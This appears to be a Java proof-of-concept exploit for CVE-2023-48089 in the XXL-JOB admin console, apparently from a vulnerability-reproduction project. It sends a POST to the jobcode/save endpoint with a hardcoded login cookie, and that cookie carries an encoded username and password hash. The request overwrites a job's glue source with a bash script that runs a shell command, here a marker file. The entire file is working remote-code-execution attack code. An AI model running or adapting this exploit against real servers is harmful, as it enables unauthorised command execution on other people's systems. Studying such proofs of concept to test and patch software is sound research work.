package xxljob;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.net.URLEncoder;

public class CVE_2023_48089 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.200:8080/xxl-job-admin/jobcode/save";
        String id = "6";
        String cmd = "touch /tmp/success";
        String cookieID = "7b226964223a322c22757365726e616d65223a2274657374222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a2231227d";
        String body = "id=" + id + "&glueSource=%23%2Fbin%2Fbash%0A" + URLEncoder.encode(cmd) + "&glueRemark=Test";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Cookie","xxljob_adminlte_settings=on; XXL_JOB_LOGIN_IDENTITY=" + cookieID);
        httpRequest.sendStringPost(httpPost, body);

    }
}
